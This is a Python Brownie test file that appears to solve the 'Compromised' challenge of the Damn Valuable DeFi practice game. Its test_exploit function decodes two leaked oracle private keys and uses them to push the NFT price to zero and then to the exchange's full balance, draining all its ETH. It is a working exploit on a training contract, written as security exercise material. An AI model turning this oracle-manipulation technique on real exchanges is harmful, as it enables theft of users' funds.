import pytest
from brownie import Exchange, DamnValuableNFT, TrustfulOracle, TrustfulOracleInitializer, accounts
import base64
@pytest.fixture(scope='module')
def deployer():
    return accounts[0]

@pytest.fixture(scope='module')
def attacker():
    return accounts[1]

@pytest.fixture(scope='module')
def sources():
    return [
        '0xA73209FB1a42495120166736362A1DfA9F95A105',
        '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
        '0x81A5D6E50C214044bE44cA0CB057fe119097850c'
    ]

@pytest.fixture(scope='module')
def oracle(deployer,sources):
    #  Deploy the oracle and setup the trusted sources with initial prices
    
    INITIAL_NFT_PRICE = 999e18

    return TrustfulOracle.at(TrustfulOracleInitializer.deploy(
            sources,
            ['DVNFT', 'DVNFT', 'DVNTF'],
            [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE],
            {'from': deployer}
        ).oracle()
        )
        
@pytest.fixture(scope='module')
def exchange(oracle, deployer):
    # Deploy the exchange and get the associated ERC721 token

    EXCHANGE_INITIAL_ETH_BALANCE = 10000e18

    return Exchange.deploy(oracle.address,{'from':deployer,'value':EXCHANGE_INITIAL_ETH_BALANCE})

@pytest.fixture(scope='module')
def token(exchange, deployer):
    return DamnValuableNFT.at(exchange.token())


@pytest.fixture(scope='module',autouse=True)
def setup(sources,deployer):
    ''' [Challenge] Compromised '''
    
    # Fund the trusted source addresses
    for source in sources:
        deployer.transfer(to=source,amount='5 ether')

def test_exploit(oracle,exchange,token,attacker):
    # Exploit goes here
    
    # retrieve the private keys of the oracles from the hex provided by the challenge
    hex01 = bytearray.fromhex("4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35").decode()
    private_key01 = base64.b64decode(hex01)
    oracle01_account = accounts.add(private_key01.decode())

    hex02 = bytearray.fromhex("4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34").decode()
    private_key02 = base64.b64decode(hex02)
    oracle02_account = accounts.add(private_key02.decode())

    
    # update price using oracle accounts , to lower DVNFT price to zero
    oracle.postPrice("DVNFT", 0,{'from': oracle01_account})
    oracle.postPrice("DVNFT", 0,{'from': oracle02_account})

    # buy it from the exchange
    tokenID = exchange.buyOne({'from':attacker,'value':'1 wei'})

    # update the price to the balance of the exchange 
    exchangeBalance = exchange.balance()
    oracle.postPrice("DVNFT", exchangeBalance,{'from': oracle01_account})
    oracle.postPrice("DVNFT", exchangeBalance,{'from': oracle02_account})

    # approve then sell the nft back
    token.approve(exchange.address,tokenID.return_value,{'from':attacker})

    exchange.sellOne(1,{'from':attacker})



def test_success(exchange,attacker):

    assert exchange.balance() == 0

    
